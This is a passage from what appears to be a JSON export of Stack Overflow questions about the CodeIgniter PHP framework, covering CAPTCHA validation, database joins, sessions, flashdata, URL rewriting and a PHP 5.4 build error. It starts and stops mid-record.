}\n</code></pre>\n\n<blockquote>\n  <p>Why this code when i echo it in View returns ERROR:</p>\n  \n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: 4096</p>\n  \n  <p>Message: Object of class CI_DB_mysqli_result could not be converted to\n  string</p>\n  \n  <p>Filename: ankete/rezultatiankete.php</p>\n  \n  <p>Line Number: 52</p>\n</blockquote>\n"},{"tags":["codeigniter","crm"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":68,"score":-7,"question_id":12968224,"title":"How to architect a CRM in CodeIgniter","body":"<p>In my codeigniter application i have to create a functionality as provided in CRM'S that can be used to create new contacts and each contacts and have multiple points of contacts assigned and multiple credentials such as hosting password.</p>\n"},{"tags":["php","ruby-on-rails","ruby","cakephp","codeigniter"],"answer_count":18,"favorite_count":12,"up_vote_count":39,"down_vote_count":0,"view_count":12291,"score":39,"question_id":117406,"title":"Which PHP framework is closest to Ruby on Rails? CakePHP? CodeIgniter?","body":"<p>I'm going to be switching back and forth between Ruby on Rails projects, and some as-of-yet undecided PHP MVC framework projects. Which of the PHP MVC frameworks out there (<a href=\"http://cakephp.org/\">CakePHP</a>, <a href=\"http://codeigniter.com/\">CodeIgniter</a>?, others?) is most similar to Ruby on Rails in that most conventions, locations, workflows, etc. are preserved? I'm looking for the similarity in the way things are done such as directory structures, conventions, etc. Not a pros vs cons in speed, extra features, etc.</p>\n"},{"tags":["php","javascript","jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":205,"score":3,"question_id":12434169,"title":"How to resolve strange conflict between form post and ajax post?","body":"<p>On the one page, I am trying to use ajax to edit existing values. I am doing this by using <a href=\"http://www.labs.mimmin.com/inlineedit/\" rel=\"nofollow\">jQuery Inline Edit</a> and posting away the new data, updating the record and returning with success.</p>\n\n<p>This is working fine. </p>\n\n<p>Next I have implemented the ability to add new records, to do this I have a form at the end of the table, which submits post data then redirects back to the original page.</p>\n\n<p>Each of them work individually, but after I have used the form to add a new record, the inline editing stops to work. If I close the webpage and reopen it, it works fine again until I have used the form and it goes of the rails again.</p>\n\n<p>I have tried a number of solutions, clearing session data, giving the form a separate name, redirecting to an alternative page (which does work, but is not ideal as I want the form to redirect back to the original location ).</p>\n\n<p>Here is a sample of the view form data:</p>\n\n<pre><code>&lt;?php foreach($week-&gt;incomes as $income):?&gt;\n    &lt;tr&gt;\n        &lt;td&gt;&lt;?php echo $income-&gt;name;?&gt;&lt;/td&gt;\n        &lt;td width=\"70\" style=\"text-align:right;\" class=\"editableSingle income id&lt;?php echo $income-&gt;id;?&gt;\"&gt;$&lt;?php echo $income-&gt;cost;?&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n&lt;?php endforeach;?&gt;\n    &lt;?php echo form_open('budget/add/'.$week-&gt;id.'/income/index', 'class=\"form-vertical\" id=\"add_income\"'); ?&gt;\n    &lt;tr&gt;\n        &lt;td&gt;\n            &lt;input type=\"text\" name=\"name\" class=\"input-small\" placeholder=\"Name\"&gt;\n            &lt;input type=\"text\" name=\"cost\" class=\"input-small\" placeholder=\"Cost\"&gt;\n        &lt;/td&gt;\n        &lt;td&gt;\n\n            &lt;button type=\"submit\" class=\"btn btn-small pull-right\"&gt;&lt;i class=\"icon-plus \"&gt;&lt;/i&gt;&lt;/button&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>This is the javascript initialisation code:</p>\n\n<pre><code>$(function(){\n$.inlineEdit({\n    income: 'budget/update_income/',\n    expense: 'budget/update_expense/'\n}, \n{\n    animate: false,\n    filterElementValue: function($o){\n\n        if ($o.hasClass('income')) {\n            return $o.html().match(/\\$(.+)/)[1];\n        }\n        else if ($o.hasClass('expense')) {\n            return $o.html().match(/\\$(.+)/)[1];\n        }\n        else {\n            return $o.html();\n        }\n    }, \n    afterSave: function(o){\n        if (o.type == 'income') {\n            $('.income.id' + o.id).prepend('$');\n        }\n        if (o.type == 'expense') {\n            $('.expense.id' + o.id).prepend('$');\n        }\n    },\n    colors: { error:'green' }\n});\n});\n</code></pre>\n\n<p>If I can provide any more information to clarify what I have attempted etc, let me know. </p>\n\n<p><strong>Temporary Fix</strong></p>\n\n<p>It seems I have come up with a work around, not ideal as I still am not sure what is causing the issue.</p>\n\n<p>I have created a method called redirect.</p>\n\n<pre><code>public function redirect(){\n    redirect('');\n}\n</code></pre>\n\n<p>am now calling that after the form submit which has temporarily allows my multiple post submits to work.</p>\n"},{"tags":["codeigniter","captcha"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":233,"score":0,"question_id":10798333,"title":"Codeigniter captcha","body":"<p>I ran into a small problem what i cant figure out.</p>\n\n<p>I would liked to use the captcha helper without database but nothing seems to be working.</p>\n\n<p>in the construct i created a variable which generates a random string</p>\n\n<pre><code>   public function __construct()\n   {\n      parent::__construct();\n      $this-&gt;rand = random_string('numeric', 4);\n   }\n</code></pre>\n\n<p>passed this variable to the captcha values like this:</p>\n\n<pre><code> $vals = array(\n     'word'   =&gt; $this-&gt;rand,\n     'img_path'  =&gt; './captcha/',\n     'img_url'   =&gt; base_url() . 'captcha/',\n     'font_path'    =&gt; './system/fonts/texb.ttf',\n     'img_width'    =&gt; '150',\n     'img_height' =&gt; 30,\n     'expiration' =&gt; 7200\n     );\n\n $cap = create_captcha($vals);\n</code></pre>\n\n<p>and wanted to validate it with a callback function like this</p>\n\n<pre><code>   function captcha_check()\n   {\n      if($this-&gt;input-&gt;post('code') != $this-&gt;rand)\n      {\n         $this-&gt;form_validation-&gt;set_message('captcha_check', 'Wrong captcha code, hmm are you the Terminator?');\n         return false;\n      }\n   }\n</code></pre>\n\n<p>And nothing works, the problem is, captcha code is show with the image, the problem is the validation, if i type in the correct numbers in my captcha field it always showing me the error, no mather what i type in, could please someone give me a hint?</p>\n\n<p>html:</p>\n\n<pre><code>  &lt;label for=\"code\"&gt;Count please &lt;/label&gt;\n      &lt;?php echo $rand; ?&gt;\n  &lt;input type=\"text\" id=\"code\" name=\"code\" class=\"span3\" /&gt;\n</code></pre>\n\n<p>validation line:</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('code', 'Captcha', 'required|callback_captcha_check');\n</code></pre>\n"},{"tags":["php","validation","codeigniter","captcha"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":364,"score":0,"question_id":10571804,"title":"CodeIgniter CAPTCHA validation","body":"<p>I have created some form for inserting data into database and for checking if the data was sent from human I have used CAPTCHA which is already integrated to CI.</p>\n\n<p>This is my controller:</p>\n\n<pre><code>    $checkrules = array(\n        'img_path' =&gt; realpath(APPPATH . '../upload/checking/img') . '/',\n        'img_url' =&gt; base_url() . 'upload/checking/img/',\n        'font_path' =&gt; realpath(APPPATH . '../upload/checking/font.ttf'),\n        'img_width' =&gt; 150,\n        'img_height' =&gt; 30,\n        'expiration' =&gt; 7200\n    );\n\n    $check = create_captcha($checkrules);\n    $data['checkimg'] = $check['image'];\n\n    $this-&gt;form_validation-&gt;set_rules('name', 'Name', 'required|max_length[40]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('email', 'E-mail', 'required|valid_email|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('website', 'Website', 'max_length[80]|prep_url|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('comment', 'Comment', 'required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('check', 'Check', 'required|xss_clean');\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        $this-&gt;load-&gt;view('cms/theme', $data);\n    }\n    else\n    {\n        echo \"success\";\n        $this-&gt;load-&gt;view('cms/theme', $data);\n    }\n</code></pre>\n\n<p>My question now is what's the best way to validate CAPTCHA?</p>\n\n<p>1.) Creating callback, which I have already done, but there was problem because when I send form is error with new CAPTCHA code.</p>\n\n<p>2.) Inserting CAPTCHA's code into database and check from it. Problem is because there will be a lot of loading database and it will be very busy.</p>\n\n<p>And second question. Is this CAPTCHA saving only .jpg pictures in folder or it can be any other format there? (I'm asking this because I want to delete this captcha's after they are used.)</p>\n"},{"tags":["codeigniter","quality","resize-image"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12967716,"title":"Resize image with Codeigniter with low quality","body":"<p>I am using CodeIgniter to resize image, but the small image I have resized is low quality.\nHere is my code:</p>\n\n<pre><code>$config = array(\n    'image_library' =&gt; 'gd2',\n    'quality' =&gt; '100',\n    'source_image' =&gt; $temp_full_path,\n    'new_image' =&gt; $full_temp_path.\"img_mobile/\",\n    'maintain_ratio' =&gt; true,\n    'create_thumb' =&gt; false,\n    'width' =&gt; 50,\n    'height' =&gt; 50\n);              \n$this-&gt;image_lib-&gt;initialize($config);              \n$this-&gt;image_lib-&gt;resize();\n</code></pre>\n\n<p>How can make resize image with high quality like it's original image?</p>\n\n<p>Here is original image, image resize generate from php code and image resize generate from codeigniter: <a href=\"http://i.stack.imgur.com/Bk8r9.jpg\" rel=\"nofollow\">Image</a></p>\n"},{"tags":["mysql","codeigniter","friends"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12965393,"title":"need help tweaking codeigniter friend query","body":"<p>hello more knowledgeable horde.  very new here, trying to write a simple 'friends' query.  i have searched the SO base and couldn't divine the answer from the other questions/solutions.</p>\n\n<p>i have two seemingly standard tables, one for membership with id/firstname/lastname etc, the other a friendship table with id/inviter_id/friend_id/status.  i have chosen (arbitrarily) to have friendship structured as one row per relationship rather than two rows per relationship.  (seems as though this problem would be easier / non-existent with two rows per, but feels like it would cause other problems and would like to solve it with one if possible.)</p>\n\n<p>i am trying to return an array of firstname/lastname for all the people who are friends with the current user, and am mostly succeeding except i am also getting the user himself listed for each find, so 8 rows includes 4 of the current user e.g.  here is my codeigniter query:</p>\n\n<pre><code>$id = $this-&gt;session-&gt;userdata('id');\n$this-&gt;db-&gt;select('first_name, last_name')-&gt;from(\"members\");\n$this-&gt;db-&gt;join('friendship', 'friendship.id_inviter = members.id OR friendship.id_friend = members.id');   \n$where1 = \"friendship.status = 'accepted' AND friendship.id_friend = $id\";\n$where2 = \"friendship.status = 'accepted' AND friendship.id_inviter = $id\";\n$this-&gt;db-&gt;where($where1);\n$this-&gt;db-&gt;or_where($where2);\n$query = $this-&gt;db-&gt;get();\nreturn $query;\n</code></pre>\n\n<p>i imagine it's some elegant finesse i just can't see.  any thoughts?  thanks in advance.</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12953232,"title":"Passing parameters when initializing a library in Codeigniter","body":"<p>I am really new to Codeigniter, and just learning from scratch. In the CI docs it says:</p>\n\n<pre><code>$params = array('type' =&gt; 'large', 'color' =&gt; 'red');\n$this-&gt;load-&gt;library('Someclass', $params);\n</code></pre>\n\n\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Someclass {\n\n    public function __construct($params)\n    {\n        // Do something with $params\n    }\n}\n</code></pre>\n\n<p>Can you give me simple example how to pass data from controller to external library using array as parameters? I'd like to see a simple example.</p>\n"},{"tags":["php","codeigniter","syntax","codeigniter-2"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":131,"score":-2,"question_id":11532925,"title":"How do you enable short-tag syntax in codeigniter?","body":"<p>I have an app (CodeIgniter) that uses the</p>\n\n<pre><code>&lt;?=$variable?&gt;\n</code></pre>\n\n<p>syntax instead of</p>\n\n<pre><code>&lt;?php echo $variable; ?&gt;\n</code></pre>\n\n<p>and I would like for it to work on my local host. What is it that I need to enable in my php.ini file to do this?</p>\n\n<p>Please note, I am not asking how to enable short_open_tag, but how to enable this in CodeIgniter.</p>\n\n<p>Thanks in advance..</p>\n"},{"tags":["php","codeigniter","header","port","elastic-beanstalk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12967941,"title":"How to retrieve the port information from the header in PHP (Code igniter)?","body":"<p>I am trying to get the port information from the header request in PHP.  Code Igniter to be specific?</p>\n\n<p>I tried doing:</p>\n\n<pre><code>    $headers = apache_request_headers();\n</code></pre>\n\n<p>Port Information is not available.  </p>\n\n<p>We are using an Elastic Beanstalk from Amazon as a server.  We were told that:\nThere is a header sent from the EC2 load balancer called \"X-Forwarded-Proto\" which fluctuates depending on if we are http or https.</p>\n\n<p>If I try to do:</p>\n\n<pre><code>    $headers = apache_request_headers(); \n    $port = $headers[\"X-Forwarded-Port\"]; \n    echo \"X-Forwarded-Port : \" . $port;\n</code></pre>\n\n<p>This gives me an \nERROR - 2012-10-19 00:48:05 --> Severity: Notice --> Undefined index: X-Forwarded-Port</p>\n\n<p>I would appreciate any thoughts on how to get the PORT information from the headers!</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["php","jquery","ajax","mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":10632803,"title":"Why am I getting a 500 Internal Server Error?","body":"<p>I'm learning so far, but this db ajax communication always makes me bang my head against the wall.</p>\n\n<p>This is the controller:</p>\n\n<pre><code>function become_teacher()\n{   \n    $this-&gt;load-&gt;model('class_model');\n    $data = array('user_id' =&gt; $this-&gt;input-&gt;post('user_id'),\n        'group_id' =&gt; $this-&gt;input-&gt;post('user_group') \n    );\n    $this-&gt;class_model-&gt;change_to_teacher($data);\n}\n</code></pre>\n\n<p>Here is the Model:</p>\n\n<pre><code>function change_to_teacher($data)\n{\n    $this-&gt;db-&gt;insert('user_groups', $data);\n    return;     \n}\n</code></pre>\n\n<p>And here is the script:</p>\n\n<pre><code>&lt;p&gt;Om du vill kunna skapa lektionen bli lärare. &lt;/p&gt;\n&lt;button class=\"btn teacher\"&gt;Bli lärare&lt;/button&gt;\n\n&lt;script type=\"text/javascript\"&gt;\n    var user_id = $('.meta').text().trim();\n    var user_group = '4';\n    $('.teacher').on('click', function() {\n        $.ajax({\n            type: \"POST\",\n            url: \"http://localhost:8888/testing/index.php/cours/become_teacher\",\n            data: \"{ user_id: user_id, user_group: user_group }\",\n            contentType: \"application/json; charset=utf-8\",\n            dataType: \"json\",\n        });\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>The <code>var user_id</code> is getting its data from the header file, not included here.\nAny help would be much appreciated!</p>\n"},{"tags":["php","codeigniter","session","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12945851,"title":"CI Can't find session variable when project is accessed from server [solved]","body":"<p>EDIT: Zen's comment below ( which is already the accepted answer ) did the trick. I've overwritten the php.ini on the server with the one on my workstation. I no longer have this problem.</p>\n\n<p>On the server: I've tried to print $this->session->userdata('uid') in the controller right after I've set this session, and everything's good during that point but when I var_dump this uid in my login page it returns false. It doesn't exist. I've also already tried erasing cookies and everything in my browser several times. Also tried rebooting.</p>\n\n<p>On my localhost: Everything is working fine.</p>\n\n<p>Has anybody experienced this?</p>\n\n<p>Background: After the system gets the login information entered by the user then validated if the user exists in the database, that's when this session variable is set in the model.</p>\n\n<p>Has anybody experienced this?</p>\n\n<p>My work station is running XAMPP 1.7.7 on windows 7 and the server is using XAMPP for linux on centOS, my browser is chrome. Anything else I should specify please let me know. Thank you.</p>\n"},{"tags":["mysql","database","codeigniter","activerecord","join"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12953972,"title":"Codeigniter database Join not accepting value instead of column name","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7860441/codeigniter-activerecord-join-backticking\">Codeigniter ActiveRecord: join backticking</a>  </p>\n</blockquote>\n\n\n\n<p>I want to give a value in the place of column name but it is not able to recognize it and it is giving me error. Here is my code:</p>\n\n<pre><code>$this-&gt;db-&gt;select('*')-&gt;from('users')-&gt;where('users.ID',$this-&gt;session-&gt;userdata('user_id'));\n$this-&gt;db-&gt;join('contact','contact.ID = 1','left');\n$result =  $this-&gt;db-&gt;get()-&gt;row_array();\n</code></pre>\n\n<p>The issue is with the join and it is not accepting value.It is giving me this error</p>\n\n<pre><code>error:\n\nUnknown column '1' in 'on clause'\n</code></pre>\n\n<p>I have to use 1 because there is no relation between the tables and in the contact table there is only one row. </p>\n"},{"tags":["php","codeigniter","datamapper","dmz"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":352,"score":0,"question_id":5448506,"title":"Connecting to mulitple databases with DMZ DataMapper","body":"<p>I'm using the DMZ DataMapper ORM for CodeIgniter.</p>\n\n<p>I'm sure it is possible to configure it to connect to multiple databases. I haven't found any documentation yet. Has anyone done this before?</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite","redirect","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12963515,"title":"Taking a site down temporarily with Codeigniter (301 possible with routes.php?)","body":"<p>I'm using Codeigniter with the standard .htaccess rewrite rules so that no /index.php/ is visible within the urls.</p>\n\n<p>Now I recently needed to take the site down temporarily and therefore wanted to redirect everyone to a 'down' page. The following worked:</p>\n\n<pre><code>$route['default_controller'] = \"down\";\n$route['(:any)'] = \"down\";\n</code></pre>\n\n<p>But I'm aware that in this case, a 301 is really appropriate.</p>\n\n<p>How and where should I set that? I don't see a way to specify it in the routes.php and was confused about how to do it within the .htaccess because of the existing rules....</p>\n\n<pre><code>RewriteBase /\n\nRewriteCond %{REQUEST_URI} ^_system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^myapp.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond $1 !^(index\\.php|resources|files|robots\\.txt)\nRewriteRule ^(.*)$ index.php/$1 \n</code></pre>\n"},{"tags":["php","codeigniter","pcre","php-5.4"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":1,"view_count":1403,"score":1,"question_id":10338234,"title":"PHP 5.4 after-install: preg_match(): Compilation failed: unknown option bit(s) set at offset 0","body":"<p>I recently upgraded my PHP to version 5.4.1 on my Lion OS X 64bit, I'm getting an error thrown in Codeigniter:</p>\n\n<pre><code>Severity: Warning\n\nMessage: preg_match(): Compilation failed: unknown option bit(s) set at offset 0\n\nFilename: core/Utf8.php\n\nLine Number: 44\n</code></pre>\n\n<p>I Googled the problem, this seems to be a problem with the PCRE lib in PHP, well I followed <a href=\"http://www.hirmet.com/mac-os-x-lion-upgrade-to-php-5-4\" rel=\"nofollow\">this tutorial</a> which shows to install pcre with homebrew which I did (I'm running pcre 8.30) and this didn't solve the problem.</p>\n\n<p>I've tried looking around for solutions, but I haven't came across one that helped - is there a method of fixing this PCRE lib problem?</p>\n\n<p>EDIT: Just edited this question to remind me what my installation was:</p>\n\n<pre><code>./configure \\\n--prefix=/usr \\\n--mandir=/usr/share/man \\\n--infodir=/usr/share/info \\\n--sysconfdir=/private/etc \\\n--with-apxs2=/usr/sbin/apxs \\\n--enable-cli \\\n--with-config-file-path=/etc \\\n--with-libxml-dir=/usr \\\n--with-openssl=/usr \\\n--with-kerberos=/usr \\\n--with-zlib=/usr \\\n--enable-bcmath \\\n--with-bz2=/usr \\\n--enable-calendar \\\n--with-curl=/usr \\\n--enable-dba \\\n--enable-exif \\\n--enable-ftp \\\n--with-gd \\\n--with-freetype-dir=/usr/X11/ \\\n--with-jpeg-dir=/usr \\\n--with-png-dir=/usr/X11/ \\\n--enable-gd-native-ttf \\\n--with-icu-dir=/usr \\\n--with-iodbc=/usr \\\n--with-ldap=/usr \\\n--with-ldap-sasl=/usr \\\n--with-libedit=/usr \\\n--enable-mbstring \\\n--enable-mbregex \\\n--with-mysql=mysqlnd \\\n--with-mysqli=mysqlnd \\\n--with-pdo-mysql=mysqlnd \\\n--with-mysql-sock=/var/mysql/mysql.sock \\\n--with-readline=/usr \\\n--enable-shmop \\\n--with-snmp=/usr \\\n--enable-soap \\\n--enable-sockets \\\n--enable-sysvmsg \\\n--enable-sysvsem \\\n--enable-sysvshm \\\n--with-tidy \\\n--enable-wddx \\\n--with-xmlrpc \\\n--with-iconv-dir=/usr \\\n--with-xsl=/usr \\\n--enable-zip \\\n--with-pgsql=/usr \\\n--with-pdo-pgsql=/usr \\\n--with-mcrypt=/usr/local/lib\n</code></pre>\n"},{"tags":["php","mysql","ajax","codeigniter","e-commerce"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12965543,"title":"Codeigniter / Ecommerce Drill Down Menu with Active Record / MySQL","body":"<p>I am creating a custom ecommerce system for a client who sells custom grad gear. I have the following screen shot of my product layout...</p>\n\n<p><img src=\"http://i.stack.imgur.com/EkwPd.png\" alt=\"Ecom image\"></p>\n\n<p>I have the form on the right side of the page that has a max price, colors and materials. When you click the Update options it sends all the data via jquery's ajax function over to my codeigniter controller where i need to pull a new list of products with the options that they have selected and within the price range they have selected. I then pass the products array to a codeigniter view and return the view to the cart with the ajax success variable. </p>\n\n<p>So I can get this working with just colors, or just materials, but my problem is figuring out how to pull a set of products that has all of the materials and options I need. I guess I just can't wrap my brain around the best way to do it. I thought about pulling a list with the correct colors, then a list with the correct materials, then a list with the correct pricing and then deleting duplicates in a merged array, but it just doesn't feel like thats the best way to do it. </p>\n\n<p>This particular client only needs \"color\" and \"material\" as an option so my products table is set up to have the id of the color and the id of the material all in the products table. Then I have a colors and materials table with the id and the color or the id and the material. </p>\n\n<p>What are you guys thoughts on the best way to do this? I'd like to use codeigniters active record to do the mysql stuff.</p>\n\n<h1>///// EDITS ///////////////////////////////////////</h1>\n\n<p>Here is an image of my product Tables:\n<img src=\"http://i.stack.imgur.com/ShVt9.jpg\" alt=\"product tables\"></p>\n\n<p>Also, here is my jquery controlling the submit of data to the codeigniter controller:</p>\n\n<pre><code>//Filter Options Ajax\n</code></pre>\n\n<p>$('#updateOptions').click(function(event) {</p>\n\n<pre><code>//Prevent the default href action\nevent.preventDefault();\n\nvar filterOptions = $('#filterForm').serialize();\n\n//Get the site url\nvar siteUrl = $('#siteUrl').val();\n\n//Roll up the product listing div and show a loader\n$('div.products').slideUp( 500, 'easeInExpo' );\n$('div.loader').delay(500).fadeIn();\n\n//Get a new list of products and repopulate the information\n$.ajax({\n     type: \"POST\",\n     url: siteUrl + \"category/filterProducts\",\n     data: { filterOptions: filterOptions },\n     success: function(data) {\n        $('div.loader').fadeOut(500);\n        $('div.products').html(data).delay(500).slideDown( 500, 'easeOutExpo' );\n     } \n});\n</code></pre>\n\n<p>});</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12964926,"title":"Load CodeIgniter models in Controller constructor","body":"<p>Coming from C#/.NET MVC 3/4, I'm not really used to CodeIgniter's implementation of models.</p>\n\n<p>The documentation shows models being loaded within controller methods, however I'm using the model in almost every method and my model is storing data used across its methods in properties via its constructor.</p>\n\n<p>Is there any reason  NOT to instantiate the model in the controller constructor that I'm overlooking?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":637,"score":1,"question_id":10159286,"title":"CodeIgniter form helper text input fields causing html parsing","body":"<p>I am using CodeIgniter and on an edit form its pulling in data from the database. Sometimes this data contains apostrophes, ampersands etc..</p>\n\n<p>How can i get CI to not parse this and change it to HTML version so end users can edit it.!</p>\n\n<p><strong>This is an image of the edit form, this text field has data pulled in from the database and populated into the input text field. The data does not contain any special chars as you can see in the second image below.</strong></p>\n\n<p><img src=\"http://i.stack.imgur.com/b7RiN.jpg\" alt=\"enter image description here\"></p>\n\n<p>Here is a screenshot of how the data looks in the table, note i am only pulling from the far right column. Not the 4th column:\n<img src=\"http://i.stack.imgur.com/ukCdd.png\" alt=\"enter image description here\"></p>\n\n<p>As you can tell the data isnt being stored as html converted, yet CI is still converting it.</p>\n\n<p><strong>Here is a snippet of the above text field:</strong></p>\n\n<pre><code>&lt;?php    \n/**\n * Form Field attribute settings\n * @author Mike DeVita\n */\n$companyname = array(\n    'name'  =&gt; 'companyname',\n    'placeholder' =&gt; 'Enter Your Companies Name',\n    'id'    =&gt; 'companyname',\n    'value' =&gt; set_value('', $points['pointFields']['companyname']-&gt;uf_fieldvalue),\n    'maxlength' =&gt; 80,\n    'size'  =&gt; 30\n);\n            &lt;div class=\"_100\"&gt;\n                &lt;p&gt;&lt;?php echo form_label('Company Name', $companyname['id']); ?&gt;&lt;?php echo form_input($companyname); ?&gt;&lt;/p&gt;\n                &lt;?php echo form_error($companyname['id']); ?&gt;\n            &lt;/div&gt;\n</code></pre>\n\n<p><strong>Here is a snippet of the insert to database:</strong></p>\n\n<pre><code>function addUserFieldHtml($compiledHtml){\n    foreach ($compiledHtml as $cHK =&gt; $cHV){\n        $data = array (\n            'pointid' =&gt; $cHV['pointId'],\n            'timestamp' =&gt; time(),\n            'html' =&gt; $cHV['html'],\n            'fieldid' =&gt; $cHV['fieldId'],\n            'fieldvalue' =&gt; $cHV['fieldValue']\n        );\n        $this-&gt;db-&gt;insert('userfields', $data);\n\n    }\n}#end addUserFieldHtml() function\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":783,"score":-2,"question_id":8309732,"title":"set_flashdata some times not working in my codeigniter application","body":"<p>I am using codeigniter , in my controller i can not set the flashdata , but i can set the user data </p>\n\n<pre><code> /**\n * this will send the requests for the gmail wrapper\n * @return void\n * @author Sandaruwan\n * */\n\nfunction send_contacts()\n{\n    $contacts = $this-&gt;input-&gt;post('contact');\n    if (count($contacts) != 0 &amp;&amp; is_array($contacts)) \n    {   \n        $data = $this-&gt;gmailmanager-&gt;send_messeges($contacts);\n\n         echo \"error message ===&gt;\"; print_r($this-&gt;message-&gt;get_message ()); echo \"&lt;br/&gt;\";\n\n        $this-&gt;session-&gt;set_flashdata('message',$this-&gt;message-&gt;get_message ());\n        echo \"flash data ===&gt;\"; print_r($this-&gt;session-&gt;flashdata('message')); echo \"&lt;br/&gt;\";\n\n\n        $this-&gt;session-&gt;set_userdata('user',$this-&gt;message-&gt;get_message ());\n        echo \"user data ===&gt;\"; print_r($this-&gt;session-&gt;userdata('user')); echo \"&lt;br/&gt;\";\n\n        exit;\n\n        redirect('connections/connection_inviter/invite');\n    }\n    else\n    {\n        $this-&gt;message-&gt;set_information(array(_('You have not selected a conatact!')));\n        $this-&gt;session-&gt;set_flashdata('message',$this-&gt;message-&gt;get_message ());\n        redirect('connections/connection_inviter/invite');  \n    }\n}\n</code></pre>\n\n<p>this is the result </p>\n\n<pre><code>    error message ===&gt;\n\n    Warning\n\n        Email sending error!\n\n\n    flash data ===&gt;\n    user data ===&gt;\n\n    Warning\n\n        Email sending error\n\n!\n</code></pre>\n\n<p>the problem is i can get the <code>error message</code> and <code>userdata</code>  but can not get the <code>flashdata</code> , i can not figure out why i can not get the <code>flashdata</code> right after initialized .</p>\n\n<p>in some controllers flashdata works perfectly . </p>\n\n<p>UPDATE</p>\n\n<pre><code>function invite() {\n$this-&gt;load-&gt;library(\"connections/Outlookmanager\");\n\nprint_r($this-&gt;ci-&gt;session-&gt;flashdata('message'); die;\n\n    //Invite friends links        \n$this-&gt;data['is_windows']=$this-&gt;outlookmanager-&gt;is_windows_user();\n$this-&gt;load-&gt;view('connections/invite_friends', $this-&gt;data);\n\n}\n</code></pre>\n\n<p>when i print <code>flashdata</code> in <code>function invite()</code> it is not printing .</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>hmmmm . actually there is a very interesting issue ,  </p>\n\n<p>i had the error message <code>Email sending error</code> i changed it to <code>err</code> now flash data working . i again changed message to <code>Email sending error</code> and it is again not working . then i again changed it to <code>err</code> then again flashdata works . </p>\n\n<p>what is this , i think error message length is causing the problem here , and i don't know why </p>\n"},{"tags":["php","codeigniter","function","parameters","uri"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12964039,"title":"Codeigniter Prevent Passing Parameter to Function to Avoid Non-Existent URI Segment","body":"<p>So I have a page:</p>\n\n<p><a href=\"http://www.mysite.com/controller/function\" rel=\"nofollow\">http://www.mysite.com/controller/function</a> </p>\n\n<p>The function is defined in the controller as:</p>\n\n<pre><code>function ()\n{\n//some stuff here\n}\n</code></pre>\n\n<p>However it is possible to resolve the URL:\n<a href=\"http://www.mysite.com/controller/function/blablabla\" rel=\"nofollow\">http://www.mysite.com/controller/function/blablabla</a></p>\n\n<p>i.e. \"blablabla\" can be passed to the function and forms an additional URI segment, but still brings up the same page. I have the same issue with a number of controllers / functions - how do I prevent parameters being passed to the function (or appearing as a URI segment)?</p>\n\n<p>I've been working with Codeigniter and PHP for around 6 months very part time, so forgive me if the answer is obvious but my searches haven't been fruitful on this.</p>\n\n<p>My goal is optimised SEO - unsure whether better to redirect the page with the extra URI segment to the correct page or to the 404 page.</p>\n"},{"tags":["php","mysql","ajax","codeigniter","long-polling"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":176,"score":-3,"question_id":12945292,"title":"jquery/ajax long-polling php mysql codeigniter","body":"<p>TO THE PEOPLE WHO VOTED THIS NOT A REAL QUESTION THAT IS ABSOLUTELY IDIOTIC.  </p>\n\n<p>I have searched and searched with Google over a month now and I can't find an accurate example\nthat actually works of ajax long polling with php and mysql. 